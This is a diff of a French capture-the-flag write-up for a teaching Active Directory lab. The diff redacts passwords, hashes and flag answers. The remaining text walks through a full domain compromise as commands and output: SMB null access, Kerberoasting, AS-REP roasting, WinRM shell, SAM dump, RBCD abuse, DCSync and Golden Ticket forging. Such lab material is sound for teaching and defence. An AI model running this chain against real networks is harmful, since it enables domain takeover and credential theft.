@@ -10,7 +10,7 @@ difficulte: "Hard"
 
 ## Contexte
 
-Ce CTF interne (M2 Cyber) est un lab pédagogique Active Directory. Le domaine cible est `secure.intra` et le poste attaquant est une machine Kali sur le même réseau. L'objectif est de compromettre progressivement le domaine, du simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine.
+Ce CTF (M2 Cyber) est un lab pédagogique Active Directory. Le domaine cible est `secure.intra` et le poste attaquant est une machine Kali sur le même réseau. L'objectif est de compromettre progressivement le domaine, du simple mot de passe faible jusqu'au contrôle total du contrôleur de domaine.
 
 ## Cartographie de l'environnement
 
@@ -76,38 +76,6 @@ SMB   192.168.0.201   445   DESKTOP-6RF7HK7   [*] ... (signing:False) (Null Auth
 
 Deux observations exploitables ici. La signature SMB est désactivée (relais possible) et `.201` accepte les connexions anonymes (Null Auth: True).
 
-## Mot de passe faible (LDAP)
-
-> "Certains utilisateurs ne comprendront jamais…" Le flag est le MD5 du mot de passe trouvé.
-
-### Concept
-
-Un mot de passe trivial (identique au nom d'utilisateur, mot du dictionnaire) reste la porte d'entrée la plus fréquente en AD. Avec un premier compte valide, on peut interroger LDAP pour énumérer tout l'annuaire (comptes, descriptions, dates de mot de passe).
-
-### Exploitation
-
-```bash
-nxc ldap 192.168.0.200 -u Welcome -p Welcome123 --users
-```
-
-```text
-LDAP   192.168.0.200   389   WIN-VOPS298ID4C   [+] secure.intra\Welcome:Welcome123
-LDAP   192.168.0.200   389   WIN-VOPS298ID4C   [*] Enumerated 9 domain users: secure.intra
-   Administrateur   ...  Compte d'administration
-   krbtgt           ...  Compte de service du KDC
-   mssqluser        ...
-   John             ...  <- mot de passe = "John"
-   ...
-```
-
-Le compte `John` a un mot de passe identique à son login (`John:John`).
-
-**Le flag est le MD5 du mot de passe `John`.**
-
-```bash
-echo "John" | md5sum
-```
-
 ## Accès anonyme SMB
 
 > "Accès anonyme au partage de fichiers." Le flag est le contenu de `flag.txt`.
@@ -143,7 +111,7 @@ Les autres fichiers du partage donnent du contexte réutilisable plus tard.
 ```text
 # Compte.txt
 Le compte AD par défaut pour se connecter :
-Welcome:Welcome123
+Welcome:<password>
 
 # Todo.txt
 - Accès winrm a la machine avec mon compte : Fait      <- indice pour la partie WinRM
@@ -151,7 +119,31 @@ Welcome:Welcome123
 - Activer et sécuriser les services correctement sur le poste : A faire
 ```
 
-**Le flag est le contenu de `flag.txt`.**
+## Mot de passe faible (LDAP)
+
+> "Certains utilisateurs ne comprendront jamais…" Le flag est le MD5 du mot de passe trouvé.
+
+### Concept
+
+Un mot de passe trivial (identique au nom d'utilisateur, mot du dictionnaire) reste la porte d'entrée la plus fréquente en AD. Avec un premier compte valide, on peut interroger LDAP pour énumérer tout l'annuaire (comptes, descriptions, dates de mot de passe).
+
+### Exploitation
+
+```bash
+nxc ldap 192.168.0.200 -u Welcome -p <password> --users
+```
+
+```text
+LDAP   192.168.0.200   389   WIN-VOPS298ID4C   [+] secure.intra\Welcome:<password>
+LDAP   192.168.0.200   389   WIN-VOPS298ID4C   [*] Enumerated 9 domain users: secure.intra
+   Administrateur   ...  Compte d'administration
+   krbtgt           ...  Compte de service du KDC
+   mssqluser        ...
+   John             ...
+   ...
+```
+
+Le compte `John` a un mot de passe identique à son login.
 
 ## Compte de service (Kerberoasting)
 
@@ -168,7 +160,7 @@ Le Kerberoasting cible les comptes disposant d'un SPN (Service Principal Name). 
 nmap -Pn -p 88 --open 192.168.0.0/24     # -> WIN-VOPS298ID4C (192.168.0.200)
 
 # Demande des TGS des comptes à SPN, écrits dans kerb.txt
-nxc ldap 192.168.0.200 -u Welcome -p Welcome123 --kerberoasting kerb.txt
+nxc ldap 192.168.0.200 -u Welcome -p <password> --kerberoasting kerb.txt
 
 # Synchronisation d'horloge (Kerberos rejette un décalage supérieur à ~5 min)
 sudo ntpdate 192.168.0.200
@@ -177,13 +169,7 @@ sudo ntpdate 192.168.0.200
 hashcat -m 13100 kerb.txt rockyou-75.txt
 ```
 
-```text
-mssqluser:Password1
-```
-
-Le compte `mssqluser` (compte de service SQL avec SPN) a pour mot de passe `Password1`.
-
-**Le flag est le MD5 du mot de passe `Password1`.**
+On obtient le mot de passe du compte `mssqluser` (compte de service SQL avec SPN).
 
 ## Pas de pré-authentification (AS-REP Roasting)
 
@@ -206,7 +192,7 @@ GetNPUsers.py secure.intra/ -usersfile users.txt -dc-ip 192.168.0.200 \
 
 ```text
 [-] User Administrateur doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$Pierre@SECURE.INTRA:c35d5c70...       <- seul Pierre est vulnérable
+$krb5asrep$23$Pierre@SECURE.INTRA:c35...       <- Pierre est vulnérable
 [-] User John doesn't have UF_DONT_REQUIRE_PREAUTH set
 ...
 ```
@@ -216,13 +202,7 @@ $krb5asrep$23$Pierre@SECURE.INTRA:c35d5c70...       <- seul Pierre est vulnérab
 hashcat -m 18200 asrep.txt rockyou-75.txt
 ```
 
-```text
-Pierre:butterfly
-```
-
 Seul `Pierre` a la pré-authentification désactivée, il est donc AS-REP-roastable.
-
-**Le flag est le MD5 du mot de passe `butterfly`.**
 
 > [!note] Kerberoasting ou AS-REP Roasting
 > Le Kerberoasting cible un SPN (TGS-REP, mode 13100), l'AS-REP Roasting cible l'absence de pré-authentification (AS-REP, mode 18200). Deux faiblesses Kerberos distinctes, deux modes hashcat différents.
@@ -239,17 +219,17 @@ WinRM (Windows Remote Management, port 5985) permet l'administration distante en
 
 ```bash
 # --local-auth (authentification locale à la machine)
-nxc winrm 192.168.0.201 -u John -p John --local-auth
+nxc winrm 192.168.0.201 -u John -p <password> --local-auth
 ```
 
 ```text
-WINRM   192.168.0.201   5985   DESKTOP-6RF7HK7   [+] DESKTOP-6RF7HK7\John:John (Pwn3d!)
+WINRM   192.168.0.201   5985   DESKTOP-6RF7HK7   [+] DESKTOP-6RF7HK7\John:<password> (Pwn3d!)
 ```
 
 Le `(Pwn3d!)` confirme l'accès. On ouvre un shell interactif.
 
 ```bash
-evil-winrm-py -i 192.168.0.201 -u John -p 'John'
+evil-winrm-py -i 192.168.0.201 -u John -p '<password>'
 ```
 
 On obtient un shell sur `DESKTOP-6RF7HK7` en tant que `John`. Cet accès permet ensuite d'extraire les ruches de registre `SAM` et `SYSTEM`.
@@ -273,15 +253,13 @@ secretsdump.py -sam sam.bak -system system.bak LOCAL
 [*] Target system bootKey: 0x44784f2fe5cd2d0a7839cd8086fcd05f
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrateur:500:aad3b435...:<hash NT Administrateur>:::   <- flag
-John:1001:aad3b435...:f0cff78ea8d2d87e5d1caccf01d0bd2f:::
-Install:1002:aad3b435...:122fb9fe2b172fcf36b5168cb2495815:::  <- pour le RBCD
+John:1001:aad3b435...:f0c...:::
+Install:1002:aad3b435...:<hash NT Install>:::  <- pour le RBCD
 ...
 ```
 
-**Le flag est le hash NT de l'Administrateur local.**
-
 > [!note] Pour la suite
-> Le hash NT du compte `Install` (`122fb9fe...`) récupéré ici permet la suite de l'attaque. Il servira pour le RBCD.
+> Le hash NT du compte `Install` récupéré ici permet la suite de l'attaque. Il servira pour le RBCD.
 
 ## ACL et RBCD
 
@@ -300,8 +278,8 @@ Le compte `Install` possède un contrôle total (FullControl) sur l'objet machin
 Étape 1, vérifier que le hash d'`Install` s'authentifie et lire le MachineAccountQuota.
 
 ```bash
-nxc smb 192.168.0.150 192.168.0.201 192.168.0.200 -u Install -H 122fb9fe2b172fcf36b5168cb2495815
-nxc ldap 192.168.0.200 -u Install -H 122fb9fe2b172fcf36b5168cb2495815 -M maq
+nxc smb 192.168.0.150 192.168.0.201 192.168.0.200 -u Install -H <hash NT Install>
+nxc ldap 192.168.0.200 -u Install -H <hash NT Install> -M maq
 ```
 
 ```text
@@ -314,15 +292,15 @@ Le `MachineAccountQuota: 10` autorise un utilisateur standard à créer jusqu'à
 Étape 2, créer le compte machine contrôlé.
 
 ```bash
-bloodyAD --host 192.168.0.200 -d secure.intra -u Install -p ':122fb9fe2b172fcf36b5168cb2495815' \
-  add computer 'TEST' 'Test123#'
+bloodyAD --host 192.168.0.200 -d secure.intra -u Install -p ':<hash NT Install>' \
+  add computer 'TEST' '<password>'
 ```
 
 Étape 3, écrire la relation de délégation.
 
 ```bash
 rbcd.py -delegate-from 'TEST$' -delegate-to 'WIN-VOPS298ID4C$' -action write \
-  -hashes :122fb9fe2b172fcf36b5168cb2495815 secure.intra/Install -dc-ip 192.168.0.200
+  -hashes :<hash NT Install> secure.intra/Install -dc-ip 192.168.0.200
 ```
 
 `-delegate-from` est le compte contrôlé, `-delegate-to` la machine visée, `-action write` l'inscription dans `msDS-AllowedToActOnBehalfOfOtherIdentity`.
@@ -334,7 +312,7 @@ sudo ntpdate 192.168.0.200          # resynchronisation d'horloge
 unset KRB5CCNAME                     # on repart d'un cache propre
 
 getST.py -spn cifs/WIN-VOPS298ID4C.secure.intra -impersonate Administrateur \
-  -dc-ip 192.168.0.200 'secure.intra/TEST$:Test123#'
+  -dc-ip 192.168.0.200 'secure.intra/TEST$:<password>'
 ```
 
 `-spn cifs/...` cible le service d'accès SMB de la machine, `-impersonate` demande le ticket au nom de l'Administrateur.
@@ -372,20 +350,20 @@ secretsdump.py -k -no-pass WIN-VOPS298ID4C.secure.intra -just-dc-user krbtgt
 
 ```text
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-krbtgt:502:aad3b435...:d6be34c05d536eab311a578824b40514:::   <- clé de signature du domaine
+krbtgt:502:aad3b435...:<hash NT krbtgt>:::   <- clé de signature du domaine
 ```
 
 Étape 2, récupérer le SID du domaine.
 
 ```bash
-nxc ldap 192.168.0.200 -u Install -H 122fb9fe2b172fcf36b5168cb2495815 \
+nxc ldap 192.168.0.200 -u Install -H <hash NT Install> \
   --query "(objectClass=domain)" "objectSid"
 ```
 
 Étape 3, forger le Golden Ticket.
 
 ```bash
-ticketer.py -nthash d6be34c05d536eab311a578824b40514 \
+ticketer.py -nthash <hash NT krbtgt> \
   -domain-sid S-1-5-21-2931287595-4144871426-66956829 \
   -domain secure.intra Administrateur
 ```
@@ -436,7 +414,7 @@ nslookup SAUVEGARDE01.secure.intra 192.168.0.200      # -> 192.168.0.240
 secretsdump.py -k -no-pass WIN-VOPS298ID4C.secure.intra -just-dc-user Administrateur
 
 # DN de la cible, puis GPO liée à l'OU (attribut gPLink)
-nxc ldap WIN-VOPS298ID4C.secure.intra -u Administrateur -H 9e29b8729a1712e6c7967248b8b21b28 \
+nxc ldap WIN-VOPS298ID4C.secure.intra -u Administrateur -H <hash NT Administrateur> \
   --query "(name=SAUVEGARDE01)" "distinguishedName"
 ```
 
@@ -459,14 +437,14 @@ Avec le contrôle du domaine obtenu par le RBCD et le Golden Ticket, la suite lo
 Voici l'enchaînement des challenges.
 
 ```text
-Welcome:Welcome123 (partage anonyme SMB)
+Welcome:<password> (partage anonyme SMB)
         |  énumération LDAP
         .
 Comptes du domaine -> Kerberoasting mssqluser
                    -> AS-REP Roasting Pierre
         |
         .
-John:John -> WinRM sur DESKTOP-6RF7HK7
+John:<password> -> WinRM sur DESKTOP-6RF7HK7
         |  extraction SAM/SYSTEM
         .
 Hash NT local d'Install
